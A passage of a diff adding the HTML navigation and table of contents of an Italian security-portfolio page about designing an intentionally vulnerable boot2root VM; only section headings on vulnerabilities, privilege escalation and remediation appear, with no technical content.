@@ -1,0 +1,2248 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Reportistica tecnica, assessment AD/Web/Network, threat modeling e remediation strategy.">
+      
+      
+        <meta name="author" content="Ing. Marco P.">
+      
+      
+        <link rel="canonical" href="https://marcop-sed.github.io/portfolio/eth/">
+      
+      
+        <link rel="prev" href="../signed/">
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Boot2Root Design - Waifu Gallery - Marco Pulicanò - Offensive Security & Engineering Portfolio</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="cyan">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#boot2root-vm-design-waifu-gallery-artificial-vulnerability-orchestration" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="Marco Pulicanò - Offensive Security &amp; Engineering Portfolio" class="md-header__button md-logo" aria-label="Marco Pulicanò - Offensive Security & Engineering Portfolio" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Marco Pulicanò - Offensive Security & Engineering Portfolio
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Boot2Root Design - Waifu Gallery
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="cyan"  aria-label="Dark Mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Dark Mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="cyan"  aria-label="Light Mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Light Mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href=".." class="md-tabs__link">
+        
+  
+  
+    
+  
+  🏠 Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../imagery/" class="md-tabs__link">
+          
+  
+  
+  🔴 Offensive Security
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="./" class="md-tabs__link">
+          
+  
+  
+  ⚙️ Projects
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="Marco Pulicanò - Offensive Security &amp; Engineering Portfolio" class="md-nav__button md-logo" aria-label="Marco Pulicanò - Offensive Security & Engineering Portfolio" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Marco Pulicanò - Offensive Security & Engineering Portfolio
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🏠 Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔴 Offensive Security
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🔴 Offensive Security
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../imagery/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Application - Imagery
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../expressway/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Network & Crypto - Expressway
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../darkzero/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AD Infrastructure - DarkZero
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../signed/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kerberos & SQL - Signed
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ⚙️ Projects
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    ⚙️ Projects
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Boot2Root Design - Waifu Gallery
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Boot2Root Design - Waifu Gallery
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#progetto-accademico-progettazione-e-implementazione-di-un-ambiente-vulnerabile-controllato" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Progetto Accademico: Progettazione e Implementazione di un Ambiente Vulnerabile Controllato
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-concept-architettura-del-sistema" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Concept &amp; Architettura del Sistema
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1. Concept &amp; Architettura del Sistema">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#11-come-labbiamo-pensata" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1.1 Come l'Abbiamo Pensata
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#12-architettura-dove-abbiamo-messo-cosa" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1.2 Architettura: Dove Abbiamo Messo Cosa
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-vulnerability-landscape-exploitation-chains" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Vulnerability Landscape &amp; Exploitation Chains
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. Vulnerability Landscape &amp; Exploitation Chains">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#21-vulnerability-summary-matrix" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.1 Vulnerability Summary Matrix
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22-attack-chain-visualization" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.2 Attack Chain Visualization
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-vulnerabilita-di-accesso-implementazione-personale" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Vulnerabilità di Accesso (Implementazione Personale)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Vulnerabilità di Accesso (Implementazione Personale)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#31-weak-ssh-credentials-easy-mode" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.1 Weak SSH Credentials – Easy Mode
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3.1 Weak SSH Credentials – Easy Mode">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Setup
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lexploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        L'Exploit
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#32-web-command-injection-medium-mode" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.2 Web Command Injection – Medium Mode
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3.2 Web Command Injection – Medium Mode">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#la-vulnerabilita" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        La Vulnerabilità
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#come-risolverla" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Come Risolverla
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#33-file-upload-bypass-hard-mode" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.3 File Upload Bypass – Hard Mode
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3.3 File Upload Bypass – Hard Mode">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lidea" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        L'Idea
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#come-la-trovi" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Come la Trovi
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lexploit_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        L'Exploit
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#difesa" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Difesa
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-privilege-escalation-come-diventare-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Privilege Escalation – Come Diventare Root
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. Privilege Escalation – Come Diventare Root">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#41-suid-hping3-easy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.1 SUID hping3 – Easy
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.1 SUID hping3 – Easy">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cose-hping3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cos'è hping3?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lexploit_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        L'Exploit
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#perche-funziona" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Perché funziona
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#difesa_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Difesa
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#42-cronjob-path-hijacking-medium" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.2 Cronjob PATH Hijacking – Medium
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.2 Cronjob PATH Hijacking – Medium">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#come-funziona" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Come Funziona
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vulnerability-discovery-phase" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vulnerability Discovery Phase
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-vulnerability-relative-vs-absolute-paths" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The Vulnerability: Relative vs Absolute Paths
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploitation-chain" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploitation Chain
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remediation-multi-layered" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Remediation (Multi-Layered)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#43-ldso-hijacking-hard" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.3 LD.SO Hijacking – Hard
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.3 LD.SO Hijacking – Hard">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#come-funziona-lelf-loader" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Come Funziona L'ELF Loader
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#discovery-finding-the-vulnerable-binary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Discovery: Finding the Vulnerable Binary
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-exploit-creating-malicious-library" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The Exploit: Creating Malicious Library
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remediation-hardening" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Remediation (Hardening)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-come-ripararlo-strategie-di-defense" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Come Ripararlo – Strategie di Defense
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. Come Ripararlo – Strategie di Defense">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#51-priorita-di-fix" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.1 Priorità di Fix
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#52-la-strategia-di-difesa" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.2 La Strategia Di Difesa
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#progetto-accademico-progettazione-e-implementazione-di-un-ambiente-vulnerabile-controllato" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Progetto Accademico: Progettazione e Implementazione di un Ambiente Vulnerabile Controllato
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-concept-architettura-del-sistema" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Concept &amp; Architettura del Sistema
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1. Concept &amp; Architettura del Sistema">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#11-come-labbiamo-pensata" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1.1 Come l'Abbiamo Pensata
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#12-architettura-dove-abbiamo-messo-cosa" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1.2 Architettura: Dove Abbiamo Messo Cosa
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-vulnerability-landscape-exploitation-chains" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Vulnerability Landscape &amp; Exploitation Chains
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. Vulnerability Landscape &amp; Exploitation Chains">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#21-vulnerability-summary-matrix" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.1 Vulnerability Summary Matrix
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22-attack-chain-visualization" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.2 Attack Chain Visualization
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-vulnerabilita-di-accesso-implementazione-personale" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Vulnerabilità di Accesso (Implementazione Personale)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Vulnerabilità di Accesso (Implementazione Personale)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#31-weak-ssh-credentials-easy-mode" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.1 Weak SSH Credentials – Easy Mode
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3.1 Weak SSH Credentials – Easy Mode">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Setup
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lexploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        L'Exploit
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#32-web-command-injection-medium-mode" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.2 Web Command Injection – Medium Mode
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3.2 Web Command Injection – Medium Mode">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#la-vulnerabilita" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        La Vulnerabilità
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#come-risolverla" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Come Risolverla
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#33-file-upload-bypass-hard-mode" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.3 File Upload Bypass – Hard Mode
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3.3 File Upload Bypass – Hard Mode">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lidea" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        L'Idea
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#come-la-trovi" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Come la Trovi
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lexploit_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        L'Exploit
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#difesa" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Difesa
+      
+    </span>
+  </a>
